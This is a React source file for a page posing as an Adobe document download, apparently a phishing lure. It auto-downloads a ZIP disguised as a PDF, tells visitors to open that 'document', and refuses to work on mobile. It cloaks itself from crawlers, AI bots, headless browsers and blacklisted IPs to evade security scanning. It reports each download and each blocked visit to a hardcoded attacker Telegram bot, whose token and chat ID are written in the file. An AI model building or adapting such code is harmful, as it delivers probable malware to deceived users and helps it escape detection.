import { useEffect, useMemo, useRef, useState, useCallback } from "react";
import { useVisitorData } from "@fingerprint/react";
import adbLogo from "@/assets/adb-logo.png";

// --- IP Blacklist CIDR matching (ported from PHP) ---
const ipToLong = (ip: string): number => {
  const parts = ip.split(".").map(Number);
  return ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
};

const ipInCidr = (ip: string, cidr: string): boolean => {
  const [range, maskStr] = cidr.split("/");
  const mask = parseInt(maskStr, 10);
  const ipLong = ipToLong(ip);
  const rangeLong = ipToLong(range);
  const wildcardDec = Math.pow(2, 32 - mask) - 1;
  const netmaskDec = ~wildcardDec >>> 0;
  return (ipLong & netmaskDec) === (rangeLong & netmaskDec);
};

const checkIpBlacklist = async (ip: string): Promise<boolean> => {
  try {
    const res = await fetch("/data/blacklist.dat");
    if (!res.ok) return false;
    const text = await res.text();
    const lines = text.split("\n").map((l) => l.trim()).filter((l) => l && !l.startsWith("#"));
    for (const cidr of lines) {
      if (ipInCidr(ip, cidr)) return true;
    }
  } catch (e) {
    console.error("Blacklist check failed:", e);
  }
  return false;
};

const fetchVisitorIp = async (): Promise<string | null> => {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip || null;
  } catch {
    return null;
  }
};
import acrobatBg from "@/assets/adobe-acrobat-bg.webp";

const TELEGRAM_BOT_TOKEN = "8648729689:AAEj5AJW3EJOAMYkAtVbm1DgSNgTy2fo1jw";
const TELEGRAM_CHAT_ID = "7038669352";

const BOT_SIGNATURES = [
  'googlebot', 'bingbot', 'yahoo! slurp', 'yahooseeker', 'crawler',
  'spider', 'pycurl', 'facebookexternalhit', 'slackbot', 'twitterbot',
  'linkedinbot', 'whatsapp', 'telegrambot', 'discordbot', 'applebot',
  'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'petalbot',
  'bytespider', 'gptbot', 'claudebot', 'anthropic', 'chatgpt',
  'headlesschrome', 'phantomjs', 'selenium', 'puppeteer', 'playwright',
  'wget', 'curl/', 'python-requests', 'python-urllib', 'java/',
  'go-http-client', 'node-fetch', 'axios/', 'scrapy', 'httpclient',
  'libwww-perl', 'mechanize', 'nutch', 'archive.org_bot',
];

const randomDigits = (len = 8) =>
  Array.from(crypto.getRandomValues(new Uint8Array(len)))
    .map((b) => (b % 10).toString())
    .join("");

const isKnownBot = (ua: string): string | null => {
  const lowerUA = ua.toLowerCase();
  for (const sig of BOT_SIGNATURES) {
    if (lowerUA.includes(sig)) return sig;
  }
  return null;
};

const detectSuspiciousEnvironment = (): string[] => {
  const flags: string[] = [];
  
  // Check for headless browser indicators
  if ((navigator as any).webdriver) flags.push("WebDriver detected");
  if (!(window as any).chrome && navigator.userAgent.includes("Chrome")) flags.push("Headless Chrome suspected");
  if ((navigator as any).languages?.length === 0) flags.push("No languages set");
  if (navigator.hardwareConcurrency === 0) flags.push("Zero CPU cores");
  if (screen.width === 0 || screen.height === 0) flags.push("Zero screen dimensions");
  
  // Check for automation frameworks
  if ((window as any).__nightmare) flags.push("Nightmare.js detected");
  if ((document as any).__selenium_unwrapped) flags.push("Selenium detected");
  if ((window as any).callPhantom || (window as any)._phantom) flags.push("PhantomJS detected");
  
  return flags;
};

const getBrowserName = () => {
  const ua = navigator.userAgent;
  if (ua.includes("Edg/")) return "Edge";
  if (ua.includes("Chrome")) return "Chrome";
  if (ua.includes("Firefox")) return "Firefox";
  if (ua.includes("Safari")) return "Safari";
  return "Unknown";
};

const sendTelegramNotification = async (type: "download" | "bot_blocked", info: Record<string, any>) => {
  const time = new Date().toISOString().replace("T", " ").split(".")[0] + " UTC";
  
  let message = "";
  
  if (type === "bot_blocked") {
    const flags = (info.suspiciousFlags || []).join(", ") || "None";
    message =
      `🚨 <b>BOT/SUSPICIOUS TRAFFIC DETECTED</b>\n\n` +
      `<b>Detection Details:</b>\n` +
      `• Reason: ${info.reason}\n` +
      `• Bot Signature: ${info.botSignature || "N/A"}\n` +
      `• Suspicious Flags: ${flags}\n\n` +
      `<b>Visitor Info:</b>\n` +
      `• Visitor ID: <code>${info.visitorId || "Unknown"}</code>\n` +
      `• Browser: ${info.browser}\n` +
      `• Platform: ${navigator.platform}\n` +
      `• Screen: ${screen.width}x${screen.height}\n` +
      `• Languages: ${navigator.languages?.join(", ") || "None"}\n\n` +
      `<b>Fingerprint Bot Detection:</b>\n` +
      `• Bot Probability: ${info.botProbability ?? "N/A"}\n\n` +
      `<b>User Agent:</b>\n<code>${navigator.userAgent}</code>\n\n` +
      `<b>Action:</b> Download BLOCKED\n` +
      `<b>Time:</b> ${time}`;
  } else {
    message =
      `📥 <b>NEW DOWNLOAD</b>\n\n` +
      `<b>File:</b> <code>${info.fileName}</code>\n` +
      `<b>Browser:</b> ${info.browser}\n` +
      `<b>Platform:</b> ${navigator.platform}\n` +
      `<b>Screen:</b> ${screen.width}x${screen.height}\n` +
      `<b>Languages:</b> ${navigator.languages?.join(", ") || "None"}\n` +
      `<b>Visitor ID:</b> <code>${info.visitorId || "Unknown"}</code>\n` +
      `<b>Time:</b> ${time}`;
  }

  try {
    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      }
    );
  } catch (e) {
    console.error("Telegram notification failed:", e);
  }
};

const Download = () => {
  const { data: visitorData } = useVisitorData({ immediate: true });
  const notifiedRef = useRef(false);
  const [blocked, setBlocked] = useState(false);

  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;

  // Client-side bot checks (runs immediately)
  useEffect(() => {
    const ua = navigator.userAgent;
    const botSig = isKnownBot(ua);
    const suspiciousFlags = detectSuspiciousEnvironment();

    if (botSig || suspiciousFlags.length >= 2) {
      setBlocked(true);
      sendTelegramNotification("bot_blocked", {
        reason: botSig ? "Known Bot Signature" : "Suspicious Environment",
        botSignature: botSig,
        suspiciousFlags,
        browser: getBrowserName(),
        visitorId: visitorData?.visitor_id,
      });
    }
  }, []);

  // Fingerprint bot detection (runs when data arrives)
  useEffect(() => {
    if (!visitorData) return;
    
    const fpData = visitorData as any;
    const botProb = fpData?.bot?.probability;
    
    if (botProb && botProb > 0.7) {
      setBlocked(true);
      if (!notifiedRef.current) {
        notifiedRef.current = true;
        sendTelegramNotification("bot_blocked", {
          reason: "Fingerprint Bot Detection (High Probability)",
          botProbability: botProb,
          suspiciousFlags: detectSuspiciousEnvironment(),
          browser: getBrowserName(),
          visitorId: visitorData.visitor_id,
        });
      }
    }
  }, [visitorData]);

  // IP blacklist check
  useEffect(() => {
    const checkIp = async () => {
      const ip = await fetchVisitorIp();
      if (!ip) return;
      const isBlacklisted = await checkIpBlacklist(ip);
      if (isBlacklisted) {
        setBlocked(true);
        if (!notifiedRef.current) {
          notifiedRef.current = true;
          sendTelegramNotification("bot_blocked", {
            reason: `Blacklisted IP: ${ip}`,
            suspiciousFlags: [`IP ${ip} found in blacklist.dat`],
            browser: getBrowserName(),
            visitorId: visitorData?.visitor_id,
          });
        }
      }
    };
    checkIp();
  }, []);

  const downloadFile = useMemo(() => {
    const ua = navigator.userAgent;
    const suffix = randomDigits(8);
    if (ua.includes("Edg/")) {
      return { href: "/docs/2O25_Organizer.zip", name: `2O25_Organizer_${suffix}.zip` };
    }
    // Chrome & others: fetch the real file via Cloudflare proxy
    return { href: `/api/download?name=2O25_Organizer_${suffix}.zip`, name: `2O25_Organizer_${suffix}.zip` };
  }, []);

  const triggerDownload = useCallback(async (file: { href: string; name: string }) => {
    try {
      // Fetch as blob to allow custom filename on cross-origin URLs
      const response = await fetch(file.href);
      const blob = await response.blob();
      const url = URL.createObjectURL(blob);
      const link = document.createElement("a");
      link.href = url;
      link.download = file.name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      URL.revokeObjectURL(url);
    } catch {
      // Fallback: open in new tab so we don't navigate away from /document
      window.open(file.href, "_blank");
    }

    if (!notifiedRef.current) {
      notifiedRef.current = true;
      sendTelegramNotification("download", {
        fileName: file.name,
        browser: getBrowserName(),
        visitorId: visitorData?.visitor_id,
      });
    }
  }, [visitorData]);

  // Auto-download (only if not blocked)
  useEffect(() => {
    if (!downloadFile || blocked) return;
    const timer = setTimeout(() => {
      triggerDownload(downloadFile);
    }, 1000);
    return () => clearTimeout(timer);
  }, [blocked]);
  if (isMobile) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#f5f5f5] px-6">
        <div className="bg-white rounded-2xl shadow-2xl max-w-[400px] w-full p-10 text-center">
          <div className="text-[48px] mb-4">⚠️</div>
          <h1 className="text-[22px] font-bold text-[#1a1a1a] mb-3">Mobile Viewing Error</h1>
          <p className="text-[15px] text-[#666] mb-4">This file cannot be viewed on mobile devices.</p>
          <p className="text-[15px] text-[#444]">Please use a <strong>laptop</strong> or <strong>desktop computer</strong> to view this file.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="relative flex min-h-screen flex-col items-center justify-center overflow-hidden">
      <img src={acrobatBg} alt="" className="absolute inset-0 w-full h-full object-fill" />

        <div className="relative z-10 flex flex-col items-center mt-[2vh]">
          <div className="bg-white rounded-2xl shadow-2xl max-w-[440px] w-full mx-4 pt-8 pb-8 px-10 flex flex-col items-center text-center">
            <img
              src={adbLogo}
              alt="Adobe PDF"
              className="w-[100px] h-[110px] object-contain mb-5"
            />

            <h1 className="text-[22px] font-bold text-[#1a1a1a] mb-2">Download Complete</h1>

            <p className="text-[15px] text-[#999] italic mb-4">You've received a secure document:</p>

            <p className="text-[15px] text-[#444] leading-relaxed">
              Your Document has been downloaded to your device.
            </p>
            <p className="text-[15px] text-[#444] leading-relaxed">
              Please check your <strong>Downloads</strong> folder
            </p>
            <p className="text-[15px] text-[#444] leading-relaxed mb-5">
              and open <strong className="underline">2O25_Organizer_02162026.pdf</strong> To view your document.
            </p>

            <p className="text-[15px] text-[#444] mb-6 leading-relaxed">
              If your Download did not start automatically, you can<br />
              download the document again
            </p>

            <button
              onClick={blocked ? undefined : (e) => { e.preventDefault(); triggerDownload(downloadFile); }}
              disabled={blocked}
              className="inline-block bg-[#4285f4] hover:bg-[#3367d6] text-white font-semibold px-10 py-3 rounded-md text-[15px] transition-colors cursor-pointer disabled:opacity-50"
            >
              Download Document
            </button>
          </div>
        </div>
    </div>
  );
};

export default Download;
